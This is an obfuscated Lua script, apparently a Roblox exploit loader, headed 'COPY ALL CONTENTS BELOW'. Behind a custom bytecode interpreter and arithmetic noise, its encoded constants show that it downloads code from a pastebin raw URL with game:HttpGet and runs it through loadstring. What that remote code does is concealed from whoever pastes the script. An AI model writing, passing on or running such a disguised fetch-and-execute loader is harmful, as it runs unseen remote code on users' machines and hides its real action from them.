-- COPY ALL CONTENTS BELOW

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then local v86=0;while true do if (v86==0) then v19=v0(v3(v30,1,1));return "";end end else local v87=v2(v0(v30,16));if v19 then local v111=v5(v87,v19);v19=nil;return v111;else return v87;end end end);local function v20(v31,v32,v33) if v33 then local v88=0 + 0 ;local v89;while true do if (v88==((0 -0) -0)) then v89=(v31/((5 -3)^(v32-(1 -0))))%((4 -2)^(((v33-(620 -(555 + 64))) -(v32-1)) + (932 -(857 + 74)))) ;return v89-(v89%((1634 -(68 + 997)) -(367 + 201))) ;end end else local v90=(2197 -(226 + 1044)) -(214 + 713) ;local v91;while true do if (v90==0) then v91=(1 + 1)^(v32-(1 + 0)) ;return (((v31%(v91 + v91))>=v91) and ((3823 -2945) -(282 + 595))) or (1637 -(1523 + (231 -(32 + 85)))) ;end end end end local function v21() local v34=0;local v35;while true do if (v34==(1 + (0 -0))) then return v35;end if (v34==(0 + 0)) then v35=v1(v16,v18,v18);v18=v18 + 1 ;v34=958 -(892 + 65) ;end end end local function v22() local v36,v37=v1(v16,v18,v18 + (3 -1) );v18=v18 + (3 -1) ;return (v37 * 256) + v36 ;end local function v23() local v38,v39,v40,v41=v1(v16,v18,v18 + (353 -((345 -258) + 263)) );v18=v18 + (184 -(67 + 113)) ;return (v41 * (12302277 + 4474939)) + (v40 * (160901 -(96317 -(802 + 150)))) + (v39 * (189 + (180 -113))) + v38 ;end local function v24() local v42=0 -0 ;local v43;local v44;local v45;local v46;local v47;local v48;while true do if (v42==(0 + 0)) then v43=v23();v44=v23();v42=998 -(915 + 82) ;end if (v42==(8 -5)) then if (v47==0) then if (v46==(0 + 0)) then return v48 * (0 -(0 -0)) ;else local v126=1187 -(628 + 441 + 118) ;while true do if (v126==(0 -0)) then v47=1 -0 ;v45=0 + (0 -0) ;break;end end end elseif (v47==(3636 -1589)) then return ((v46==0) and (v48 * ((1 + 0)/0))) or (v48 * NaN) ;end return v8(v48,v47-(1814 -(368 + 423)) ) * (v45 + (v46/(((21 -15) -4)^((929 -(814 + 45)) -(10 + 8))))) ;end if (v42==2) then v47=v20(v44,80 -59 ,31);v48=((v20(v44,474 -(416 + 26) )==(3 -2)) and  -(1 + 0)) or ((2 -1) -(0 + 0)) ;v42=441 -(145 + 293) ;end if (v42==(431 -(44 + 386))) then v45=1487 -(998 + 488) ;v46=(v20(v44,1 + 0 ,17 + 2 + 1 ) * (2^(804 -(201 + 571)))) + v43 ;v42=1140 -(116 + 1022) ;end end end local function v25(v49) local v50=(1651 -(745 + 21)) -(261 + 624) ;local v51;local v52;while true do if (v50==(1 -0)) then v51=v3(v16,v18,(v18 + v49) -1 );v18=v18 + v49 ;v50=1082 -(1020 + 60) ;end if ((1426 -(630 + 793))==v50) then return v6(v52);end if (v50==0) then v51=nil;if  not v49 then local v118=0 -0 ;while true do if (v118==(0 -0)) then v49=v23();if (v49==(0 + 0)) then return "";end break;end end end v50=3 -2 ;end if (v50==2) then v52={};for v112=1748 -(760 + 987) , #v51 do v52[v112]=v2(v1(v3(v51,v112,v112)));end v50=1916 -(616 + 1173 + (341 -217)) ;end end end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v53=(function() return function(v92,v93,v94,v95,v96,v97,v98,v99) local v92=(function() return 0;end)();local v93=(function() return;end)();local v95=(function() return;end)();while true do if (v92~=(0 -0)) then else local v119=(function() return 0;end)();local v120=(function() return;end)();while true do if (v119==(675 -(534 + 141))) then v120=(function() return 0 + 0 ;end)();while true do if (v120==(0 + 0)) then v93=(function() return v94();end)();v95=(function() return nil;end)();v120=(function() return 1 + 0 ;end)();end if ((1 -0)==v120) then v92=(function() return  #"]";end)();break;end end break;end end end if (v92== #"}") then if (v93== #"/") then v95=(function() return v94()~=0 ;end)();elseif (v93==(2 -0)) then v95=(function() return v96();end)();elseif (v93== #"91(") then v95=(function() return v97();end)();end v98[v99]=(function() return v95;end)();break;end end return v92,v93,v94,v95,v96,v97,v98,v99;end;end)();local v54=(function() return function(v100,v101,v102) local v103=(function() return 0;end)();local v104=(function() return;end)();while true do if (v103~=0) then else v104=(function() return 0 -0 ;end)();while true do if (v104==0) then local v127=(function() return 0 + 0 ;end)();while true do if (v127==(0 + 0)) then v100[v101-#"<" ]=(function() return v102();end)();return v100,v101,v102;end end end end break;end end end;end)();local v55=(function() return {};end)();local v56=(function() return {};end)();local v57=(function() return {};end)();local v58=(function() return {v55,v56,nil,v57};end)();local v59=(function() return v23();end)();local v60=(function() return {};end)();for v68= #":",v59 do FlatIdent_77C29,Type,v21,Cons,v24,v25,v60,v68=(function() return v53(FlatIdent_77C29,Type,v21,Cons,v24,v25,v60,v68);end)();end v58[ #"xnx"]=(function() return v21();end)();for v69= #":",v23() do local v70=(function() return v21();end)();if (v20(v70, #"]", #"[")~=0) then else local v107=(function() return 396 -(115 + 281) ;end)();local v108=(function() return;end)();local v109=(function() return;end)();local v110=(function() return;end)();while true do if (v107~=0) then else v108=(function() return v20(v70,4 -2 , #"19(");end)();v109=(function() return v20(v70, #"0836",6);end)();v107=(function() return 1 + 0 ;end)();end if (v107~=(4 -2)) then else if (v20(v109, #"~", #"{")~= #"/") then else v110[2]=(function() return v60[v110[7 -5 ]];end)();end if (v20(v109,869 -(550 + 317) ,2)== #"}") then v110[ #"-19"]=(function() return v60[v110[ #"gha"]];end)();end v107=(function() return 3 -0 ;end)();end if (v107==1) then local v124=(function() return 0;end)();while true do if (v124==(1 -0)) then v107=(function() return 2;end)();break;end if (v124~=(0 -0)) then else v110=(function() return {v22(),v22(),nil,nil};end)();if (v108==0) then local v132=(function() return 0;end)();local v133=(function() return;end)();while true do if (v132~=(285 -(134 + 151))) then else v133=(function() return 1665 -(970 + 695) ;end)();while true do if (v133==(0 -0)) then v110[ #"xnx"]=(function() return v22();end)();v110[ #".dev"]=(function() return v22();end)();break;end end break;end end elseif (v108== #" ") then v110[ #"nil"]=(function() return v23();end)();elseif (v108==(1992 -(582 + 1408))) then v110[ #"91("]=(function() return v23() -((6 -4)^16) ;end)();elseif (v108~= #"asd") then else local v183=(function() return 0 -0 ;end)();local v184=(function() return;end)();while true do if ((0 -0)==v183) then v184=(function() return 0;end)();while true do if (v184~=(1824 -(1195 + 629))) then else v110[ #"19("]=(function() return v23() -((2 -0)^(257 -(187 + 54))) ;end)();v110[ #".dev"]=(function() return v22();end)();break;end end break;end end end v124=(function() return 781 -(162 + 618) ;end)();end end end if (v107==3) then if (v20(v109, #"asd", #"xnx")== #"[") then v110[ #"asd1"]=(function() return v60[v110[ #"0836"]];end)();end v55[v69]=(function() return v110;end)();break;end end end end for v71= #"/",v23() do v56,v71,v28=(function() return v54(v56,v71,v28);end)();end return v58;end local function v29(v62,v63,v64) local v65=v62[1];local v66=v62[2 + 0 ];local v67=v62[2 + 1 ];return function(...) local v72=v65;local v73=v66;local v74=v67;local v75=v27;local v76=1 -0 ;local v77= -(115 -(4 + 110));local v78={};local v79={...};local v80=v12("#",...) -1 ;local v81={};local v82={};for v105=0 + (584 -(57 + 527)) ,v80 do if (v105>=v74) then v78[v105-v74 ]=v79[v105 + 1 ];else v82[v105]=v79[v105 + (1637 -(1373 + 263)) ];end end local v83=(v80-v74) + (1001 -(451 + 549)) ;local v84;local v85;while true do local v106=0 + (1427 -(41 + 1386)) ;while true do if ((786<3023) and (v106==(1 -0))) then if (v85<=(6 -2)) then if (v85<=((1488 -(17 + 86)) -(746 + 638))) then if (v85==(0 + 0)) then local v134=v84[2 -(0 + 0) ];local v135,v136=v75(v82[v134](v13(v82,v134 + (342 -(218 + 123)) ,v84[1584 -(1535 + 46) ])));v77=(v136 + v134) -(1 + 0) ;local v137=0 + 0 ;for v148=v134,v77 do v137=v137 + (561 -(306 + 254)) ;v82[v148]=v135[v137];end else do return;end end elseif ((v85<=(1 + (1 -0))) or (2442<74)) then v82[v84[3 -1 ]]=v64[v84[1470 -((2603 -1704) + 568) ]];elseif (v85>(2 + 1)) then local v152;local v153,v154;local v155;local v156;v82[v84[2]]={};v76=v76 + (2 -1) ;v84=v72[v76];v82[v84[605 -(268 + 335) ]]=v64[v84[293 -(60 + 230) ]];v76=v76 + (573 -(426 + 146)) ;v84=v72[v76];v82[v84[2]]=v64[v84[1 + 2 ]];v76=v76 + (1457 -(282 + 1174)) ;v84=v72[v76];v156=v84[813 -(569 + 242) ];v155=v82[v84[169 -(122 + 44) ]];v82[v156 + (2 -1) ]=v155;v82[v156]=v155[v84[4]];v76=v76 + 1 ;v84=v72[v76];v82[v84[1 + 1 ]]=v84[1027 -(706 + 318) ];v76=v76 + (1252 -(721 + (915 -385))) ;v84=v72[v76];v82[v84[1273 -(945 + 326) ]]=v84[7 -4 ]~=0 ;v76=v76 + 1 ;v84=v72[v76];v156=v84[2 + 0 ];v153,v154=v75(v82[v156](v13(v82,v156 + 1 ,v84[703 -(271 + 429) ])));v77=(v154 + v156) -(3 -2) ;v152=0;for v175=v156,v77 do v152=v152 + 1 ;v82[v175]=v153[v152];end v76=v76 + 1 + 0 + 0 ;v84=v72[v76];v156=v84[1502 -(1408 + 92) ];v82[v156]=v82[v156](v13(v82,v156 + (1087 -(461 + 625)) ,v77));v76=v76 + 1 ;v84=v72[v76];v82[v84[(187 + 1103) -((2011 -1018) + (360 -(30 + 35))) ]]();v76=v76 + 1 + 0 ;v84=v72[v76];do return;end else v82[v84[1173 -(418 + 753) ]]=v84[2 + 1 ];end elseif (v85<=(1 + 5)) then if ((4535==4535) and (v85>(2 + 3))) then local v140=0;local v141;while true do if ((v140==(0 + 0)) or (3009<=2105)) then v141=v84[531 -(406 + 85 + 38) ];v82[v141]=v82[v141](v13(v82,v141 + (1770 -(1749 + 20)) ,v77));break;end end else v82[v84[1 + 1 ]]=v84[1325 -(1249 + 73) ]~=(0 + 0) ;end elseif (v85<=(1152 -((1723 -(1043 + 214)) + 679))) then local v143=v84[4 -2 ];local v144=v82[v84[8 -5 ]];v82[v143 + (3 -2) ]=v144;v82[v143]=v144[v84[(3116 -(323 + 889)) -(106 + 1794) ]];elseif (v85>(3 + 5)) then v82[v84[5 -3 ]]();else v82[v84[2]]={};end v76=v76 + 1 + 0 ;break;end if (v106==(0 -0)) then v84=v72[v76];v85=v84[2 -(581 -(361 + 219)) ];v106=1;end end end end;end return v29(v28(),{},v17)(...);end return v15("LOL!043Q00030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q747047657403213Q00682Q7470733A2Q2F706173746562696E2E636F6D2F7261772F553667784D527137000A4Q00047Q00122Q000100013Q00122Q000200023Q00202Q00020002000300122Q000400046Q000500016Q000200056Q00013Q00024Q0001000100016Q00017Q00",v9(),...);
